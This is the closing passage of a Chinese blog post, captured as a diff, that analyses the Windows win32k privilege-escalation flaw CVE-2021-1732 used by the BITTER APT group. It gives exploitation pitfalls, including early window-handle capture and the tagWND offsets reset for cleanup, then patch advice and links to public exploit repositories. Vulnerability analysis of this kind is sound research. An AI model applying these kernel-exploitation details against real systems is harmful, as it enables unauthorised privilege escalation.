+<p>2.<u>&#x6700;&#x5927;&#x7684;&#x7CBE;&#x5F69;&#x4E4B;&#x5904;&#x5728;&#x4E8E;CreateWindowEx&#x672A;&#x8FD4;&#x56DE;&#x65F6;&#x5982;&#x4F55;&#x83B7;&#x53D6;&#x7A97;&#x53E3;&#x53E5;&#x67C4;</u></p>
+<p>&#x7531;&#x4E8E;&#x5728;&#x91CE;&#x6837;&#x672C;&#x5728;&#x81EA;&#x5B9A;&#x4E49;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x4E2D;&#x83B7;&#x53D6;&#x53E5;&#x67C4;&#x51FD;&#x6570;&#x5B58;&#x5728;&#x5927;&#x91CF;&#x6DF7;&#x6DC6;&#xFF0C;&#x7406;&#x89E3;&#x4E0D;&#x6DF1;&#x523B;&#xFF0C;&#x540E;&#x7EED;crash&#x590D;&#x73B0;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53D1;&#x73B0;&#x62FF;&#x4E0D;&#x5230;magic&#x7A97;&#x53E3;&#x7684;&#x53E5;&#x67C4;&#x503C;&#xFF0C;&#x5219;&#x65E0;&#x6CD5;&#x89E6;&#x53D1;&#x6F0F;&#x6D1E;&#xFF0C;&#x4E00;&#x987F;&#x9677;&#x5165;&#x50F5;&#x5C40;&#xFF0C;&#x8FD9;&#x91CC;&#x5361;&#x4E86;&#x5F88;&#x4E45;&#x3002;&#x518D;&#x6B21;&#x611F;&#x8C22;&#x4E0B;git&#x4E0A;&#x7684;&#x4E24;&#x4F4D;&#x5927;&#x4F6C;&#x7ED9;&#x51FA;&#x7684;&#x4E24;&#x4E2A;&#x601D;&#x8DEF;&#xFF0C;&#x89C1;&#x524D;&#x6587;&#x6240;&#x8FF0;&#x3002;</p>
+<p>3.<u>&#x6062;&#x590D;&#x73B0;&#x573A;&#x65F6;&#x7684;&#x64CD;&#x4F5C;</u></p>
+<p>&#x4E3B;&#x8981;&#x7684;&#x95EE;&#x9898;&#x662F;&#x5BF9;&#x4E8E;magic&#x7A97;&#x53E3;&#x7684;&#x6062;&#x590D;&#xFF0C;&#x5728;&#x91CE;poc&#x7684;&#x601D;&#x8DEF;&#x662F;&#x5C06;magic&#x7A97;&#x53E3;&#x7684;tagWND+0x128&#x7F6E;&#x4E3A;0&#xFF0C;&#x800C;&#x540E;&#x5C06;magic&#x7A97;&#x53E3;&#x7684;tagWND+0xE0&#x7F6E;&#x4E3A;0&#xFF1B;&#x524D;&#x8005;&#x5F88;&#x597D;&#x7406;&#x89E3;&#xFF0C;&#x5C31;&#x662F;ExtraDataAddress&#x4E3A;0&#xFF0C;&#x800C;0xE0&#x5904;&#x7684;&#x6210;&#x5458;&#x5E76;&#x4E0D;&#x6E05;&#x695A;&#x662F;&#x4EC0;&#x4E48;&#xFF0C;&#x56E0;&#x6B64;&#x4E2A;&#x4EBA;&#x89C9;&#x5F97;&#x96BE;&#x4EE5;&#x7406;&#x89E3;&#xFF1B;&#x800C;&#x540E;KK&#x5927;&#x4F6C;&#x7684;&#x601D;&#x8DEF;&#x662F;&#x901A;&#x8FC7;&#x4EBA;&#x5DE5;&#x7533;&#x8BF7;&#x5185;&#x5B58;&#xFF0C;&#x5C06;magic&#x7A97;&#x53E3;tagWND+E8&#x5904;&#x7684;flag&#x53BB;&#x6389;0x800&#x6807;&#x5FD7;&#xFF0C;&#x8BBE;&#x7F6E;&#x4E3A;pointer&#xFF0C;&#x800C;&#x540E;&#x5C06;&#x7533;&#x8BF7;&#x7684;&#x5185;&#x5B58;&#x5199;&#x5165;tagWND+128&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x5F53;&#x9500;&#x6BC1;&#x7A97;&#x53E3;&#x65F6;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x81EA;&#x52A8;&#x91CA;&#x653E;&#x6B64;&#x5904;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x540C;&#x65F6;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;hwnd0&#xFF0C;&#x4F46;&#x662F;&#x6B64;&#x65B9;&#x6CD5;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;&#x662F;&#x548C;&#x95EE;&#x9898;1&#x6709;&#x70B9;&#x7C7B;&#x4F3C;&#xFF0C;&#x5C31;&#x662F;magic&#x7A97;&#x53E3;&#x7684;&#x5185;&#x5B58;offset&#x5B58;&#x5728;&#x5076;&#x7136;&#x6027;&#xFF0C;&#x5E76;&#x4E0D;&#x4E00;&#x5B9A;&#x6BD4;hwnd0&#x7684;offset&#x5927;&#xFF0C;&#x56E0;&#x6B64;&#x6781;&#x7AEF;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x65E0;&#x6CD5;&#x8BBE;&#x7F6E;magic&#x7A97;&#x53E3;&#x6210;&#x5458;&#x7684;&#x3002;&#x56E0;&#x6B64;&#x4E2A;&#x4EBA;&#x5728;POC&#x91CC;&#x91C7;&#x7528;&#x4E86;&#x5728;&#x91CE;&#x539F;&#x59CB;poc&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x81F3;&#x4E8E;&#x4E3A;&#x4F55;&#x5C06;tagWND0+0xE0&#x5904;&#x7F6E;0&#xFF0C;&#x6216;&#x8BB8;&#x6709;&#x77E5;&#x9053;&#x7684;&#x5E08;&#x5085;&#x53EF;&#x4EE5;&#x89E3;&#x91CA;&#x4E00;&#x4E8C;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x80AF;&#x5B9A;&#x7684;&#x662F;&#xFF0C;&#x5FC5;&#x7136;&#x5F71;&#x54CD;ExtraDataAddress&#x7684;&#x5BFB;&#x5740;&#x548C;&#x91CA;&#x653E;&#x3002;</p>
+<h2 id="&#x56DB;&#x3001;&#x7F13;&#x89E3;&#x63AA;&#x65BD;"><a href="#&#x56DB;&#x3001;&#x7F13;&#x89E3;&#x63AA;&#x65BD;" class="headerlink" title="&#x56DB;&#x3001;&#x7F13;&#x89E3;&#x63AA;&#x65BD;"></a>&#x56DB;&#x3001;&#x7F13;&#x89E3;&#x63AA;&#x65BD;</h2><p>&#x8BF7;&#x5B89;&#x88C5;2020&#x5E74;2&#x6708;&#x8865;&#x4E01;&#x3002;</p>
+<p><a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB4601315" target="_blank" rel="noopener">https://www.catalog.update.microsoft.com/Search.aspx?q=KB4601315</a></p>
+<h2 id="&#x4E94;&#x3001;&#x53C2;&#x8003;&#x6587;&#x732E;"><a href="#&#x4E94;&#x3001;&#x53C2;&#x8003;&#x6587;&#x732E;" class="headerlink" title="&#x4E94;&#x3001;&#x53C2;&#x8003;&#x6587;&#x732E;"></a>&#x4E94;&#x3001;&#x53C2;&#x8003;&#x6587;&#x732E;</h2><p>[1]WINDOWS KERNEL ZERO-DAY EXPLOIT (CVE-2021-1732) IS USED BY BITTER APT IN TARGETED ATTACK</p>
+<p><a href="https://ti.dbappsecurity.com.cn/blog/index.php/2021/02/10/windows-kernel-zero-day-exploit-is-used-by-bitter-apt-in-targeted-attack/" target="_blank" rel="noopener">https://ti.dbappsecurity.com.cn/blog/index.php/2021/02/10/windows-kernel-zero-day-exploit-is-used-by-bitter-apt-in-targeted-attack/</a></p>
+<p>[2]Windows Win32k Elevation of Privilege Vulnerability</p>
+<p><a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1732" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1732</a></p>
+<p>[3]KaLendsi/CVE-2021-1732-Exploit</p>
+<p><a href="https://github.com/KaLendsi/CVE-2021-1732-Exploit" target="_blank" rel="noopener">https://github.com/KaLendsi/CVE-2021-1732-Exploit</a></p>
+<p>[4]k-k-k-k-k/CVE-2021-1732</p>
+<p><a href="https://github.com/k-k-k-k-k/CVE-2021-1732" target="_blank" rel="noopener">https://github.com/k-k-k-k-k/CVE-2021-1732</a></p>
+<p>[5]Analyzing CVE-2016-7255 Exploit In The Wild</p>
+<p><a href="https://www.trendmicro.com/en_us/research/16/l/one-bit-rule-system-analyzing-cve-2016-7255-exploit-wild.html" target="_blank" rel="noopener">https://www.trendmicro.com/en_us/research/16/l/one-bit-rule-system-analyzing-cve-2016-7255-exploit-wild.html</a></p>
+<p>[6]LPE vulnerabilities exploitation on Windows 10 Anniversary Update Introduction </p>
+<p><a href="http://cvr-data.blogspot.com/2016/11/lpe-vulnerabilities-exploitation-on.html" target="_blank" rel="noopener">http://cvr-data.blogspot.com/2016/11/lpe-vulnerabilities-exploitation-on.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+      <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2021/03/16/20210316-1/">CVE-2021-1732：BITTER APT用于定向攻击的Windows内核提权漏洞原理及利用分析</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 Saturn35 的个人博客">Saturn35</a></p>
+  <p><span>发布时间:</span>2021年03月16日 - 19:12</p>
+  <p><span>最后更新:</span>2021年03月16日 - 19:57</p>
+  <p><span>原始链接:</span><a href="/2021/03/16/20210316-1/" title="CVE-2021-1732：BITTER APT用于定向攻击的Windows内核提权漏洞原理及利用分析">https://saturn35.github.io/2021/03/16/20210316-1/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://saturn35.github.io/2021/03/16/20210316-1/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+      
+      </div>
+      
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/11/10/20201109-1/" rel="next" title="CVE-2020-17087在野0day分析">
+                <i class="fa fa-chevron-left"></i> CVE-2020-17087在野0day分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/head.jpg" alt="Saturn35">
+            
+              <p class="site-author-name" itemprop="name">Saturn35</p>
+              <p class="site-description motion-element" itemprop="description">心诚求之，虽不中，不远矣。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Saturn35" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:zyty718@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/Saturn35_Huity" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://passport.kanxue.com/user-center-831334.htm" target="_blank" title="kanxue">
+                      
+                        <i class="fa fa-fw fa-book"></i>kanxue</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、漏洞信息"><span class="nav-number">1.</span> <span class="nav-text">一、漏洞信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-背景"><span class="nav-number">1.1.</span> <span class="nav-text">1.背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-漏洞简述"><span class="nav-number">1.2.</span> <span class="nav-text">2. 漏洞简述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-漏洞影响"><span class="nav-number">1.3.</span> <span class="nav-text">3.漏洞影响</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、漏洞复现"><span class="nav-number">2.</span> <span class="nav-text">二、漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-环境搭建"><span class="nav-number">2.1.</span> <span class="nav-text">1. 环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-复现过程"><span class="nav-number">2.2.</span> <span class="nav-text">2. 复现过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">三、漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-基础分析"><span class="nav-number">3.0.1.</span> <span class="nav-text">1. 基础分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-静态分析"><span class="nav-number">3.0.2.</span> <span class="nav-text">2. 静态分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-漏洞函数分析"><span class="nav-number">3.0.2.1.</span> <span class="nav-text">1. 漏洞函数分析</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-动态分析"><span class="nav-number">3.0.3.</span> <span class="nav-text">3. 动态分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-利用思路"><span class="nav-number">3.0.4.</span> <span class="nav-text">4. 利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#利用条件"><span class="nav-number">3.0.4.1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用过程"><span class="nav-number">3.0.4.2.</span> <span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-构造任意地址读原语"><span class="nav-number">3.0.4.2.1.</span> <span class="nav-text">1.构造任意地址读原语</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-构造任意地址写原语"><span class="nav-number">3.0.4.2.2.</span> <span class="nav-text">2.构造任意地址写原语</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-恢复现场"><span class="nav-number">3.0.4.2.3.</span> <span class="nav-text">3.恢复现场</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-攻击向量"><span class="nav-number">3.0.4.3.</span> <span class="nav-text">3. 攻击向量</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-利用演示"><span class="nav-number">3.0.4.4.</span> <span class="nav-text">4.利用演示</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-踩坑记录"><span class="nav-number">3.0.4.5.</span> <span class="nav-text">5.踩坑记录</span></a></li></ol></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#四、缓解措施"><span class="nav-number">4.</span> <span class="nav-text">四、缓解措施</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、参考文献"><span class="nav-number">5.</span> <span class="nav-text">五、参考文献</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Saturn35</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">97.5k</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: true,
+        appId: '1fB9JY8xOQdkT8o7B5JMLEK4-MdYXbMMI',
+        appKey: 'I5Me1NOQdPHTJgK0ELfVmocG',
+        placeholder: 'Comment here...',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<script type="text/javascript" src="/js/src/click_show_text.js"></script>
+
+<script type="text/javascript" src="/js/src/FunnyTitle.js"></script>
